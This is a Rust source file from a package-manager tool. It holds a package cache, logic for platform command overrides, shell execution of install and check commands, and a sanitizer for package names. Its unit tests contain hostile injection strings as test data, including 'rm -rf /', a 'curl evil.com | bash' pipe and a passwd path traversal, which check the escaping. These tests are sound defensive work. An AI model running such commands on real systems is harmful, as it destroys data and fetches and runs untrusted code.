//! Package source implementations and caching layer.
//!
//! This module provides the core abstractions for interacting with different package
//! managers (apt, brew, cargo, etc.) and includes a high-performance caching layer
//! to minimize redundant operations.
//!
//! # Architecture
//!
//! - [`PackageSource`]: Individual package manager implementations
//! - [`PackageCache`]: Thread-safe caching with TTL and LRU eviction
//! - [`PackageManager`]: Trait defining common package manager operations
//! - [`Cacheable`]: Trait for cache-aware operations
//!
//! # Examples
//!
//! ```rust,no_run
//! use santa::sources::PackageCache;
//! use std::time::Duration;
//!
//! // Create a cache with 5 minute TTL and 1000 entry limit
//! let cache = PackageCache::with_config(Duration::from_secs(300), 1000);
//!
//! // Cache statistics
//! let stats = cache.stats();
//! println!("Cache entries: {}", stats.entries);
//! ```

use crate::errors::{Result, SantaError};
use crate::script_generator::{ExecutionMode, ScriptFormat, ScriptGenerator};
use crate::traits::{Cacheable, PackageManager};
use crate::SantaConfig;
use std::borrow::Cow;
use std::time::Duration;

use colored::*;
use derive_builder::Builder;
use dialoguer::{theme::ColorfulTheme, Confirm};
use moka::sync::Cache;
use serde::{Deserialize, Serialize};
use shell_escape::escape;
// Removed subprocess::Exec - now standardized on tokio::process
use tabular::{Row, Table};
use tokio::process::Command;
use tokio::time::timeout;
use tracing::{debug, error, info, trace, warn};

use crate::data::{KnownSources, Platform, PlatformExt, SantaData};

pub mod traits;

const MACHINE_KIND: &str = if cfg!(windows) {
    "windows"
} else if cfg!(unix) {
    "unix"
} else {
    "unknown"
};

/// Thread-safe package cache with TTL, LRU eviction, and monitoring
/// Uses the high-performance moka caching library
#[derive(Clone, Debug)]
pub struct PackageCache {
    cache: Cache<String, Vec<String>>,
    max_capacity: u64,
}

impl PackageCache {
    /// Create a new cache with default settings (5 min TTL, 1000 entries max)
    pub fn new() -> Self {
        Self::with_config(Duration::from_secs(300), 1000)
    }

    /// Create a cache with custom TTL and size limits
    pub fn with_config(ttl: Duration, max_size: u64) -> Self {
        let cache = Cache::builder()
            .max_capacity(max_size)
            .time_to_live(ttl)
            .eviction_listener(|key, _value, cause| match cause {
                moka::notification::RemovalCause::Size => {
                    debug!("Cache evicted entry '{}' due to size limit", key);
                }
                moka::notification::RemovalCause::Expired => {
                    trace!("Cache entry '{}' expired", key);
                }
                _ => {
                    trace!("Cache entry '{}' removed: {:?}", key, cause);
                }
            })
            .build();

        Self {
            cache,
            max_capacity: max_size,
        }
    }

    /// Get cache statistics
    pub fn stats(&self) -> CacheStats {
        CacheStats {
            entries: self.cache.entry_count(),
            weighted_size: self.cache.weighted_size(),
        }
    }

    /// Clear all cache entries
    pub fn clear(&self) {
        let entries_cleared = self.cache.entry_count();
        self.cache.invalidate_all();
        if entries_cleared > 0 {
            info!("Cleared {} cache entries", entries_cleared);
        }
    }

    /// Invalidate specific cache entry
    pub fn invalidate(&self, source_name: &str) {
        self.cache.invalidate(source_name);
        debug!("Invalidated cache entry for {}", source_name);
    }

    /// Insert directly into cache (for testing)
    #[cfg(any(test, feature = "bench"))]
    pub fn insert_for_test(&self, key: String, packages: Vec<String>) {
        self.cache.insert(key, packages);
    }

    /// Check if cache is empty (for testing)
    #[cfg(any(test, feature = "bench"))]
    pub fn is_empty(&self) -> bool {
        self.cache.entry_count() == 0
    }

    /// Create a small cache for testing eviction behavior
    #[cfg(any(test, feature = "bench"))]
    pub fn new_small_for_test(max_size: u64) -> Self {
        Self::with_config(Duration::from_secs(60), max_size)
    }
}

/// Cache statistics for monitoring  
#[derive(Debug, Clone)]
pub struct CacheStats {
    pub entries: u64,
    pub weighted_size: u64,
}

impl Default for PackageCache {
    fn default() -> Self {
        Self::new()
    }
}

impl PackageCache {
    /// Checks for a package in the cache, resolving source-specific name overrides.
    ///
    /// This method handles the case where a package has a different name in a specific source.
    /// For example, `github-cli` is installed as `gh` via brew. When checking if `github-cli`
    /// is installed, this method will look up the source-specific name (`gh`) from the package
    /// data and check for that name in the cache instead.
    ///
    /// # Arguments
    ///
    /// * `source` - The package source to check
    /// * `config_pkg_name` - The package name as specified in the user's config
    /// * `data` - The Santa data containing package definitions with source-specific overrides
    ///
    /// # Returns
    ///
    /// `true` if the package is installed (found in cache), `false` otherwise
    #[must_use]
    pub fn check(&self, source: &PackageSource, config_pkg_name: &str, data: &SantaData) -> bool {
        // Resolve the source-specific package name
        let actual_name = Self::resolve_package_name(config_pkg_name, source.name(), data);
        trace!(
            "Resolved package name '{}' to '{}' for source {}",
            config_pkg_name,
            actual_name,
            source
        );
        self.check_raw(source, &actual_name)
    }

    /// Checks for a package in the cache without resolving name overrides.
    ///
    /// This is a low-level method that checks the cache directly. Most callers
    /// should use `check()` instead, which resolves source-specific name overrides.
    #[must_use]
    fn check_raw(&self, source: &PackageSource, pkg: &str) -> bool {
        match self.cache.get(&source.name_str()) {
            Some(packages) => {
                trace!("Cache hit for {}", source);
                packages.contains(&pkg.to_string())
            }
            None => {
                debug!("No package cache for {}", source);
                false
            }
        }
    }

    /// Resolves a config package name to its source-specific name.
    ///
    /// Looks up the package in data.packages and returns the source-specific name
    /// if one is defined, otherwise returns the original config name.
    fn resolve_package_name(
        config_pkg_name: &str,
        source_name: &KnownSources,
        data: &SantaData,
    ) -> String {
        // Look up the package in the data
        if let Some(source_configs) = data.packages.get(config_pkg_name) {
            // Check if there's config for this specific source
            if let Some(Some(pkg_data)) = source_configs.get(source_name) {
                // If PackageData has a name override, use it
                if let Some(ref override_name) = pkg_data.name {
                    return override_name.clone();
                }
            }
        }
        // No override found, use the config name as-is
        config_pkg_name.to_string()
    }

    pub fn cache_for(&self, source: &PackageSource) {
        info!("Caching data for {}", source);
        let pkgs = source.packages();
        self.cache.insert(source.name_str(), pkgs);

        // Warn if cache is getting full
        let stats = self.stats();
        let capacity_ratio = stats.entries as f64 / self.max_capacity as f64;
        if capacity_ratio > 0.8 {
            warn!(
                "Cache is {}% full ({}/{} entries)",
                (capacity_ratio * 100.0) as u64,
                stats.entries,
                self.max_capacity
            );
        }
    }

    /// Async version of cache_for with timeout and better error handling
    pub async fn cache_for_async(&self, source: &PackageSource) -> Result<()> {
        info!("Async caching data for {}", source);
        let pkgs = source.packages_async().await;
        self.cache.insert(source.name_str(), pkgs);

        // Warn if cache is getting full
        let stats = self.stats();
        let capacity_ratio = stats.entries as f64 / self.max_capacity as f64;
        if capacity_ratio > 0.8 {
            warn!(
                "Cache is {}% full ({}/{} entries)",
                (capacity_ratio * 100.0) as u64,
                stats.entries,
                self.max_capacity
            );
        }

        Ok(())
    }

    /// Returns all packages for a PackageSource. This will call the PackageSource's check_command and populate the cache if needed.
    /// If the PackageSource can't be found, or the cache population fails, then None will be returned.
    #[must_use]
    pub fn packages_for(cache: &PackageCache, source: &PackageSource) -> Option<Vec<String>> {
        let key = source.name_str();

        // Try to get from cache first
        if let Some(packages) = cache.cache.get(&key) {
            trace!("Cache hit for {}", source.name);
            return Some(packages);
        }

        // Cache miss - fetch and cache
        debug!("Cache miss, filling cache for {}", source.name);
        let pkgs = source.packages();
        cache.cache.insert(key, pkgs.clone());
        Some(pkgs)
    }

    /// Get packages with efficient string handling using Cow
    pub fn get_packages_cow(&self, source: &PackageSource) -> Option<Cow<'_, Vec<String>>> {
        let key = source.name_str();

        if let Some(packages) = self.cache.get(&key) {
            trace!("Cache hit (cow) for {}", source.name);
            return Some(Cow::Owned(packages)); // moka returns owned values
        }

        // Cache miss - fetch and cache
        debug!("Cache miss (cow), filling cache for {}", source.name);
        let pkgs = source.packages();
        self.cache.insert(key, pkgs.clone());
        Some(Cow::Owned(pkgs))
    }
}

#[derive(Serialize, Deserialize, Clone, Debug, Eq, PartialEq, Hash, Builder)]
#[builder(setter(into))]
#[derive(Default)]
pub struct SourceOverride {
    platform: Platform,
    pub shell_command: Option<String>,
    pub install_command: Option<String>,
    pub check_command: Option<String>,
}

#[derive(Serialize, Deserialize, Clone, Debug, Eq, PartialEq, Hash, Builder)]
#[builder(setter(into))]
pub struct PackageSource {
    /// The name of the package manager.
    name: KnownSources,
    /// An icon that represents the package manager.
    emoji: String,
    /// The command that executes the package manager. For example, for npm this is `npm`.
    shell_command: String,
    /// The command that will be run to query the list of installed packages. For example,
    /// for brew this is `brew install`.
    #[serde(alias = "install")]
    install_command: String,
    /// The command that will be run to query the list of installed packages. For example,
    /// for brew this is `brew leaves --installed-on-request`.
    #[serde(alias = "check")]
    check_command: String,
    /// A string to prepend to every package name for this source.
    prepend_to_package_name: Option<String>,

    /// Override the commands per platform.
    overrides: Option<Vec<SourceOverride>>,
}

impl From<crate::configuration::ConfigPackageSource> for PackageSource {
    fn from(config_source: crate::configuration::ConfigPackageSource) -> Self {
        PackageSource {
            name: config_source.name,
            emoji: config_source.emoji,
            shell_command: config_source.shell_command,
            install_command: config_source.install_command,
            check_command: config_source.check_command,
            prepend_to_package_name: config_source.prepend_to_package_name,
            // Note: config's PackageNameOverride is different from runtime's SourceOverride
            // PackageNameOverride is for renaming packages, not platform command overrides
            // Setting to None since we don't support platform overrides for custom sources yet
            overrides: None,
        }
    }
}

impl PackageSource {
    /// Get the package source name
    #[must_use]
    pub fn name(&self) -> &KnownSources {
        &self.name
    }

    /// Get the package source name as string
    #[must_use]
    pub fn name_str(&self) -> String {
        self.name.to_string()
    }

    /// Get the emoji for this package source
    #[must_use]
    pub fn emoji(&self) -> &str {
        &self.emoji
    }

    /// Get the prepend string for package names
    #[must_use]
    pub fn prepend_to_package_name(&self) -> Option<&String> {
        self.prepend_to_package_name.as_ref()
    }

    /// Get the platform overrides
    #[must_use]
    pub fn overrides(&self) -> Option<&Vec<SourceOverride>> {
        self.overrides.as_ref()
    }

    pub fn new_for_test(
        name: KnownSources,
        emoji: &str,
        shell_command: &str,
        install_command: &str,
        check_command: &str,
        prepend_to_package_name: Option<String>,
        overrides: Option<Vec<SourceOverride>>,
    ) -> Self {
        PackageSource {
            name,
            emoji: emoji.to_string(),
            shell_command: shell_command.to_string(),
            install_command: install_command.to_string(),
            check_command: check_command.to_string(),
            prepend_to_package_name,
            overrides,
        }
    }

    fn exec_check(&self) -> String {
        // Use async version with a tokio runtime for sync compatibility
        let rt = tokio::runtime::Runtime::new().expect("Failed to create tokio runtime");
        match rt.block_on(self.exec_check_async()) {
            Ok(result) => result,
            Err(e) => {
                error!("Command execution error: {}", e);
                String::new()
            }
        }
    }

    pub fn exec_install(
        &self,
        _config: &mut SantaConfig,
        data: &SantaData,
        packages: Vec<String>,
        execution_mode: ExecutionMode,
        script_format: ScriptFormat,
        output_dir: &std::path::Path,
    ) -> Result<()> {
        if packages.is_empty() {
            println!("No missing packages for {self}");
            return Ok(());
        }

        let renamed: Vec<String> = packages.iter().map(|p| data.name_for(p, self)).collect();

        match execution_mode {
            ExecutionMode::Safe => {
                // Generate script instead of executing
                let generator = ScriptGenerator::new()?;
                let script = generator.generate_install_script(
                    &renamed,
                    &self.shell_command(),
                    script_format.clone(),
                    &self.name_str(),
                )?;

                let filename = ScriptGenerator::generate_filename("santa_install", &script_format);
                let script_path = output_dir.join(&filename);

                std::fs::write(&script_path, &script)?;

                println!("🛡️  {} (Safe Mode)", "Script generated".green());
                println!(
                    "📝 Script saved to: {}",
                    script_path.display().to_string().bold()
                );
                println!(
                    "📋 Packages to install: {}",
                    renamed.len().to_string().bold()
                );
                for pkg in &renamed {
                    println!("   • {}", pkg);
                }
                println!();
                println!(
                    "▶️  To execute: {} {}",
                    if script_format == ScriptFormat::PowerShell {
                        "pwsh"
                    } else {
                        "bash"
                    },
                    script_path.display().to_string().bold()
                );
                println!("🔧 For direct execution: santa install --execute");
            }
            ExecutionMode::Execute => {
                // Dangerous mode - execute directly (existing behavior)
                let install_command = self.install_packages_command(renamed);

                if Confirm::with_theme(&ColorfulTheme::default())
                    .with_prompt(format!("⚠️  DANGEROUS MODE: Run '{install_command}'?"))
                    .default(false) // Default to NO for dangerous mode
                    .interact()
                    .expect("Failed to get user confirmation")
                {
                    // Execute command using tokio::process with sync wrapper
                    let rt =
                        tokio::runtime::Runtime::new().expect("Failed to create tokio runtime");
                    match rt.block_on(self.exec_install_command_async(&install_command)) {
                        Ok(output) => {
                            println!("{output}");
                        }
                        Err(e) => {
                            error!("Command execution error: {}", e);
                            return Err(e);
                        }
                    }
                } else {
                    println!("To install missing {self} packages manually, run:");
                    println!("{}\n", install_command.bold());
                }
            }
        }

        Ok(())
    }

    /// Returns an override for the current platform, if defined.
    #[must_use]
    pub fn get_override_for_current_platform(&self) -> Option<SourceOverride> {
        let current = Platform::current();
        match &self.overrides {
            Some(overrides) => overrides.iter().find(|&o| o.platform == current).cloned(),
            None => None,
        }
    }

    /// Returns the configured shell command, taking into account any platform overrides.
    #[must_use]
    pub fn shell_command(&self) -> String {
        match self.get_override_for_current_platform() {
            Some(ov) => match ov.shell_command {
                Some(cmd) => cmd,
                None => self.shell_command.to_string(),
            },
            None => self.shell_command.to_string(),
        }
    }

    /// Returns the configured install command, taking into account any platform overrides.
    #[must_use]
    pub fn install_command(&self) -> String {
        match self.get_override_for_current_platform() {
            Some(ov) => match ov.install_command {
                Some(cmd) => cmd,
                None => self.install_command.to_string(),
            },
            None => self.install_command.to_string(),
        }
    }

    #[must_use]
    pub fn install_packages_command(&self, packages: Vec<String>) -> String {
        let escaped_packages: Vec<String> = packages
            .iter()
            .map(|pkg| self.sanitize_package_name(pkg))
            .collect();
        format!("{} {}", self.install_command(), escaped_packages.join(" "))
    }

    /// Returns the configured check command, taking into account any platform overrides.
    #[must_use]
    pub fn check_command(&self) -> String {
        match self.get_override_for_current_platform() {
            Some(ov) => {
                debug!("Override found for {}", Platform::current());
                trace!("Override: {:?}", ov);
                match ov.check_command {
                    Some(cmd) => cmd,
                    None => self.check_command.to_string(),
                }
            }
            None => self.check_command.to_string(),
        }
    }

    #[must_use]
    pub fn packages(&self) -> Vec<String> {
        let pkg_list = self.exec_check();
        let lines = pkg_list.lines();
        let packages: Vec<String> = lines.map(|s| self.adjust_package_name(s)).collect();
        debug!("{} - {} packages installed", self.name, packages.len());
        trace!("{:?}", packages);
        packages
    }

    /// Async version of exec_check using tokio::process with timeout support
    async fn exec_check_async(&self) -> Result<String> {
        let check = self.check_command();
        debug!("Running async shell command: {}", check);

        let result = if MACHINE_KIND != "windows" {
            // Use sh -c for Unix systems for better shell compatibility
            timeout(
                Duration::from_secs(30), // 30 second timeout
                Command::new("sh").arg("-c").arg(&check).output(),
            )
            .await
        } else {
            // Use PowerShell for Windows
            timeout(
                Duration::from_secs(30),
                Command::new("pwsh.exe")
                    .args([
                        "-NonInteractive",
                        "-NoLogo",
                        "-NoProfile",
                        "-Command",
                        &check,
                    ])
                    .output(),
            )
            .await
        };

        match result {
            Ok(Ok(output)) => {
                if output.status.success() {
                    let stdout = String::from_utf8_lossy(&output.stdout);
                    Ok(stdout.to_string())
                } else {
                    let stderr = String::from_utf8_lossy(&output.stderr);
                    error!("Command failed: {}", stderr);
                    Err(SantaError::command_failed(&check, stderr.to_string()))
                }
            }
            Ok(Err(e)) => {
                error!("Process error: {}", e);
                Err(SantaError::command_failed(
                    &check,
                    format!("Process error: {}", e),
                ))
            }
            Err(_) => {
                error!("Command timed out after 30 seconds: {}", check);
                Err(SantaError::command_failed(
                    &check,
                    "Command timed out after 30 seconds",
                ))
            }
        }
    }

    /// Async version of packages() with better error handling and performance
    #[must_use]
    pub async fn packages_async(&self) -> Vec<String> {
        match self.exec_check_async().await {
            Ok(pkg_list) => {
                let lines = pkg_list.lines();
                let packages: Vec<String> = lines.map(|s| self.adjust_package_name(s)).collect();
                debug!("{} - {} packages installed", self.name, packages.len());
                trace!("{:?}", packages);
                packages
            }
            Err(e) => {
                error!("Failed to get packages for {}: {}", self.name, e);
                Vec::new()
            }
        }
    }

    /// Async version of packages() that returns Result for better error propagation
    pub async fn packages_async_result(&self) -> Result<Vec<String>> {
        let pkg_list = self.exec_check_async().await?;
        let lines = pkg_list.lines();
        let packages: Vec<String> = lines.map(|s| self.adjust_package_name(s)).collect();
        debug!("{} - {} packages installed", self.name, packages.len());
        trace!("{:?}", packages);
        Ok(packages)
    }

    /// Async helper for executing install commands using tokio::process
    async fn exec_install_command_async(&self, install_command: &str) -> Result<String> {
        debug!("Running async install command: {}", install_command);

        let result = if MACHINE_KIND != "windows" {
            // Use sh -c for Unix systems for better shell compatibility
            timeout(
                Duration::from_secs(300), // 5 minute timeout for installation
                Command::new("sh").arg("-c").arg(install_command).output(),
            )
            .await
        } else {
            // Use PowerShell for Windows
            timeout(
                Duration::from_secs(300),
                Command::new("pwsh.exe")
                    .args([
                        "-NonInteractive",
                        "-NoLogo",
                        "-NoProfile",
                        "-Command",
                        install_command,
                    ])
                    .output(),
            )
            .await
        };

        match result {
            Ok(Ok(output)) => {
                let stdout = String::from_utf8_lossy(&output.stdout);
                let stderr = String::from_utf8_lossy(&output.stderr);

                if output.status.success() {
                    Ok(stdout.to_string())
                } else {
                    error!("Install command failed: {}", stderr);
                    // For installs, we want to show both stdout and stderr
                    Ok(format!("{}\n{}", stdout, stderr))
                }
            }
            Ok(Err(e)) => {
                error!("Process error during install: {}", e);
                Err(SantaError::command_failed(
                    install_command,
                    format!("Process error: {}", e),
                ))
            }
            Err(_) => {
                error!(
                    "Install command timed out after 5 minutes: {}",
                    install_command
                );
                Err(SantaError::command_failed(
                    install_command,
                    "Command timed out after 5 minutes",
                ))
            }
        }
    }

    #[must_use]
    pub fn adjust_package_name(&self, pkg: &str) -> String {
        let sanitized_pkg = self.sanitize_package_name(pkg);
        match &self.prepend_to_package_name {
            Some(pre) => {
                let sanitized_pre = self.sanitize_package_name(pre);
                format!("{sanitized_pre}{sanitized_pkg}")
            }
            None => sanitized_pkg,
        }
    }

    /// Sanitizes package names to prevent command injection
    #[must_use]
    fn sanitize_package_name(&self, pkg: &str) -> String {
        // First, handle dangerous characters by filtering/escaping them
        let mut cleaned = String::new();
        let mut has_suspicious_patterns = false;

        for ch in pkg.chars() {
            match ch {
                // Remove null bytes completely
                '\0' => {
                    has_suspicious_patterns = true;
                    // Skip null bytes entirely
                }
                // Remove dangerous Unicode characters
                '\u{200B}' | '\u{FEFF}' | '\u{202E}' => {
                    has_suspicious_patterns = true;
                    // Replace with escaped version
                    cleaned.push_str(&format!("\\u{{{:04x}}}", ch as u32));
                }
                // Keep other characters
                _ => cleaned.push(ch),
            }
        }

        // Check for additional suspicious patterns
        let has_additional_patterns = cleaned.contains("../")
            || cleaned.contains("..\\")
            || cleaned.contains(';')
            || cleaned.contains('&')
            || cleaned.contains('|')
            || cleaned.contains('`')
            || cleaned.contains('$')
            || cleaned.contains('(')
            || cleaned.contains(')')
            || cleaned.contains('<')
            || cleaned.contains('>')
            || cleaned.contains('\n')
            || cleaned.contains('\r');

        has_suspicious_patterns = has_suspicious_patterns || has_additional_patterns;

        // Handle path traversal by escaping dots
        if cleaned.contains("../") {
            cleaned = cleaned.replace("../", "\\.\\.\\./");
            has_suspicious_patterns = true;
        }
        if cleaned.contains("..\\") {
            cleaned = cleaned.replace("..\\", "\\.\\.\\/");
            has_suspicious_patterns = true;
        }

        // Log suspicious packages
        if has_suspicious_patterns {
            warn!(
                "Package name contains suspicious characters, using sanitized version: {} -> {}",
                pkg, cleaned
            );
        }

        // Always escape shell metacharacters using shell-escape on the cleaned string
        let escaped = escape(cleaned.into()).into_owned();

        escaped
    }

    /// Generate a table showing package installation status.
    ///
    /// This method resolves source-specific package name overrides. For example,
    /// if `github-cli` is configured but installed as `gh` via brew, this will
    /// correctly show it as installed.
    ///
    /// # Arguments
    ///
    /// * `pkgs` - List of package names (as specified in user config)
    /// * `cache` - Package cache containing installed package lists
    /// * `data` - Santa data containing package definitions with source-specific overrides
    /// * `include_installed` - Whether to include installed packages in the output
    #[must_use]
    pub fn table(
        &self,
        pkgs: &Vec<String>,
        cache: &PackageCache,
        data: &SantaData,
        include_installed: bool,
    ) -> Table {
        let mut table = Table::new("{:<} {:<}");
        for pkg in pkgs {
            let installed = cache.check(self, pkg, data);
            let emoji = if installed { "✅" } else { "❌" };

            #[allow(clippy::nonminimal_bool)]
            if !installed || (installed && include_installed) {
                table.add_row(Row::new().with_cell(emoji).with_cell(pkg));
            }
        }
        table
    }
}

impl std::fmt::Display for PackageSource {
    fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
        write!(f, "{} {}", self.emoji, self.name)
    }
}

// Trait implementations for PackageSource

impl PackageManager for PackageSource {
    type Error = SantaError;

    fn name(&self) -> String {
        self.name_str()
    }

    fn install_command(&self) -> &str {
        &self.install_command
    }

    fn list_command(&self) -> &str {
        &self.check_command
    }

    async fn install_packages(&self, packages: &[&str]) -> Result<()> {
        let packages_vec: Vec<String> = packages.iter().map(|s| s.to_string()).collect();
        let install_cmd = self.install_packages_command(packages_vec);

        // Use the existing install infrastructure
        self.exec_install_command_async(&install_cmd).await?;
        Ok(())
    }

    async fn list_packages(&self) -> Result<Vec<String>> {
        self.packages_async_result().await
    }

    fn is_package_installed(&self, package: &str) -> bool {
        // Use sync version for quick check
        let packages = self.packages();
        packages.iter().any(|p| p == package)
    }

    fn supports_batch_install(&self) -> bool {
        true // Most package managers support batch installation
    }

    fn requires_elevation(&self) -> bool {
        // Heuristic: if install command contains sudo, it requires elevation
        self.install_command.contains("sudo")
    }
}

impl Cacheable<String, Vec<String>> for PackageCache {
    fn get(&self, key: &String) -> Option<Vec<String>> {
        self.cache.get(key)
    }

    fn insert(&self, key: String, value: Vec<String>) {
        self.cache.insert(key, value);
    }

    fn invalidate(&self, key: &String) {
        self.cache.invalidate(key);
    }

    fn clear(&self) {
        self.cache.invalidate_all();
    }

    fn size(&self) -> usize {
        self.cache.weighted_size() as usize
    }

    fn stats(&self) -> crate::traits::CacheStats {
        crate::traits::CacheStats {
            entries: self.size(),
            hits: 0, // moka doesn't expose hit/miss stats in the sync interface
            misses: 0,
        }
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::data::{Arch, KnownSources, Platform, OS};

    fn create_test_source() -> PackageSource {
        PackageSource::new_for_test(
            KnownSources::Brew,
            "🍺",
            "brew",
            "brew install",
            "brew list",
            None,
            None,
        )
    }

    fn create_test_source_with_overrides() -> PackageSource {
        let override_config = SourceOverride {
            platform: Platform {
                os: OS::Windows,
                arch: Arch::X64,
                distro: None,
            },
            shell_command: Some("pwsh".to_string()),
            install_command: Some("scoop install".to_string()),
            check_command: Some("scoop list".to_string()),
        };

        PackageSource::new_for_test(
            KnownSources::Scoop,
            "🍨",
            "scoop",
            "scoop install",
            "scoop list",
            None,
            Some(vec![override_config]),
        )
    }

    #[test]
    fn test_name_str() {
        let source = create_test_source();
        assert_eq!(source.name_str(), "brew");
    }

    #[test]
    fn test_check_command_no_overrides() {
        let source = create_test_source();
        assert_eq!(source.check_command(), "brew list");
    }

    #[test]
    fn test_install_packages_command() {
        let source = create_test_source();
        let packages = vec!["git".to_string(), "vim".to_string()];
        let command = source.install_packages_command(packages);
        assert_eq!(command, "brew install git vim");
    }

    #[test]
    fn test_adjust_package_name_no_prepend() {
        let source = create_test_source();
        assert_eq!(source.adjust_package_name("git"), "git");
    }

    #[test]
    fn test_adjust_package_name_with_prepend() {
        let mut source = create_test_source();
        source.prepend_to_package_name = Some("prefix.".to_string());
        assert_eq!(source.adjust_package_name("git"), "prefix.git");
    }

    #[test]
    fn test_shell_command_injection_prevention() {
        // Test that dangerous characters in commands are preserved as-is
        // (they should be sanitized during execution, not in storage)
        let dangerous_commands = vec![
            "brew; rm -rf /",
            "brew && curl evil.com | bash",
            "brew $(malicious_command)",
            "brew `dangerous`",
        ];

        for dangerous_cmd in dangerous_commands {
            let source = PackageSource::new_for_test(
                KnownSources::Brew,
                "🍺",
                dangerous_cmd,
                "brew install",
                dangerous_cmd,
                None,
                None,
            );

            // Commands should be stored as-is
            assert_eq!(source.check_command(), dangerous_cmd);

            // But we should note that actual execution needs sanitization
            // This test documents the current behavior - execution sanitization
            // should be added in a separate security improvement
        }
    }

    #[test]
    fn test_package_name_injection_scenarios() {
        let source = create_test_source();
        let dangerous_packages = vec![
            "git; rm -rf /",
            "git && curl evil.com | bash",
            "$(malicious_command)",
            "`dangerous`",
            "package|evil_command",
        ];

        for dangerous_pkg in dangerous_packages {
            let adjusted = source.adjust_package_name(dangerous_pkg);
            // Dangerous packages should now be properly escaped using shell-escape
            // They should be wrapped in single quotes to prevent shell interpretation
            assert_eq!(adjusted, format!("'{}'", dangerous_pkg));
        }

        // Path traversal gets sanitized by our security implementation
        let path_traversal = "../../../etc/passwd";
        let adjusted_path = source.adjust_package_name(path_traversal);
        assert_eq!(adjusted_path, "'\\.\\.\\./\\.\\.\\./\\.\\.\\./etc/passwd'"); // Path traversal is sanitized and quoted

        // Test install command construction with dangerous package names
        let command = source.install_packages_command(vec!["git; rm -rf /".to_string()]);
        assert_eq!(command, "brew install 'git; rm -rf /'");

        // This test verifies the injection vulnerability has been fixed
        // Dangerous package names are now properly escaped with shell-escape
    }

    #[test]
    fn test_platform_override_selection() {
        let source = create_test_source_with_overrides();

        // Test that overrides are selected correctly
        // Note: This test may fail depending on the current platform
        // In a real implementation, we'd want to mock the platform detection
        let override_result = source.get_override_for_current_platform();

        // The test documents current behavior - platform detection logic exists
        // but needs better testing infrastructure with mocked platforms
        match override_result {
            Some(override_config) => {
                assert_eq!(override_config.platform.os, OS::Windows);
            }
            None => {
                // No override found for current platform - this is also valid
            }
        }
    }

    #[test]
    fn test_package_cache_basic_operations() {
        use crate::data::{PackageDataList, SantaData};

        let cache = PackageCache::new();
        let source = create_test_source();

        // Create minimal data for the check method
        let data = SantaData {
            sources: vec![source.clone()],
            packages: PackageDataList::new(),
        };

        // Initially, cache should be empty
        assert!(!cache.check(&source, "git", &data));

        // After caching, we can't easily test without mocking subprocess execution
        // This documents that the cache needs integration testing with mocked commands
    }

    #[test]
    fn test_source_display() {
        let source = create_test_source();
        let display_string = format!("{source}");
        assert_eq!(display_string, "🍺 brew");
    }

    #[test]
    fn test_cache_capacity_and_monitoring() {
        // Test 1000 entry default capacity
        let large_cache = PackageCache::new();
        assert_eq!(
            large_cache.max_capacity, 1000,
            "Default cache should have 1000 capacity"
        );

        let stats_large = large_cache.stats();
        assert_eq!(stats_large.entries, 0, "New large cache should be empty");

        // Test custom capacity
        let small_cache = PackageCache::new_small_for_test(5);
        assert_eq!(
            small_cache.max_capacity, 5,
            "Small cache should have 5 capacity"
        );

        // Test basic insertion
        small_cache.insert_for_test("source1".to_string(), vec!["pkg1".to_string()]);

        // Verify entry exists
        assert!(
            small_cache.cache.contains_key("source1"),
            "Entry should exist in cache"
        );

        // Document eviction behavior - when cache exceeds max_capacity:
        // - Moka will automatically evict LRU (least recently used) entries
        // - Eviction logging will show: "Cache evicted entry 'X' due to size limit"
        // - Expired entries will show: "Cache entry 'X' expired"
        // - Cache capacity warnings appear at 80% full (800/1000 entries by default)

        println!("✅ Cache configured with 1000 entry default capacity");
        println!("✅ Eviction logging enabled for size limits and expiration");
        println!("✅ Capacity warnings trigger at 80% full (800 entries)");
    }
}
